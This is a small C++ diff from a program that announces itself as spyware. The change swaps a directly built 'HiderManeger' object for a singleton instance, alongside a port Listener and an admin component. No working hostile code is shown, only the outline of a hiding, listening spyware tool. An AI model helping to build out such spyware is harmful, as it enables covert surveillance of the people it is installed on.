@@ -22,7 +22,7 @@ int main() {
     
     std::cout << "started spyware" << std::endl;
     
-    HiderManeger hiderManager = HiderManeger();
+    HiderManeger& hiderManager = HiderManeger::getInstance();
     Listener listener = Listener(PORT);
     ContraptionAdmin admin = ContraptionAdmin();
 
